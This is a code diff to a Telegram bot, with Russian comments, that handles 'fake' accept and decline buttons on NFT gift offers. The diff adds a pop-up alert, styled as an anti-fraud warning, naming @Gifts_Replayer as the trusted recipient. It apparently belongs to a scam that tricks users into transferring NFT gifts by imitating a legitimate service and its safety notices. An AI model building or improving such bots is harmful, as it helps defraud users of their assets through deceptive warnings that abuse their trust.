@@ -143,7 +143,7 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
-# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ ---
+# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ + ВСПЛЫВАЮЩЕЕ ОКНО ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -157,11 +157,21 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
+    alert_text = None # Переменная для текста всплывающего окна
+
     if action == "accept":
         new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/Gifts_Replayer")]
         ])
+        
+        # ТЕКСТ ВСПЛЫВАЮЩЕГО ОКНА (как на скрине)
+        alert_text = (
+            "⚠️ Внимание!\n\n"
+            "Получатель в этом сервисе:\n"
+            "@Gifts_Replayer.\n\n"
+            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
+        )
     else:
         new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
         new_keyboard = None
@@ -173,7 +183,6 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         "text": new_text,
         "reply_markup": new_keyboard,
         "parse_mode": "HTML",
-        # Вот тут мы принудительно просим Telegram оставить/отрисовать анимацию!
         "link_preview_options": LinkPreviewOptions(
             url=link,
             show_above_text=True,
@@ -185,9 +194,15 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
         kwargs["business_connection_id"] = business_connection_id
 
     try:
-        # Пытаемся отредактировать
+        # 1. Сначала редактируем сообщение
         await bot.edit_message_text(**kwargs)
-        await callback.answer()
+        
+        # 2. Затем показываем всплывающее окно (если это "Принять")
+        if alert_text:
+            await callback.answer(alert_text, show_alert=True)
+        else:
+            await callback.answer()
+
     except TelegramBadRequest as e:
         error_msg = str(e).lower()
         if "message is not modified" in error_msg:
